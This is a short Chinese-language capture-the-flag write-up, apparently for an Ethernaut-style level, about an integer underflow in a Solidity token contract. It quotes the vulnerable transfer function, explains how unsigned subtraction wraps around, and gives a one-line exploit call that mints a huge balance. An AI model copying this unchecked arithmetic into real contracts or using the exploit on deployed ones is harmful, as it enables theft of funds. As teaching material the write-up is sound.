# 说明
此级别的目标是让您破解下面的基本代币合约。
一开始你会得到 20 个代币，如果你设法拿到任何额外的代币，你就会通过关卡。最好是非常大量的代币。


```
mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

```
关键代码在于存储`mapping(address => uint) balances;`使用无符号数，然后require和转账都使用了减法 `balances[msg.sender] - _value`,所以利用溢出的特点
例如
```
    uint8 A = 20; // (max storable # is 255)
    uint8 B = 21;

    A - B ---> 255
```

# 解决方案

```
 await   contract.transfer(player, 21)
```

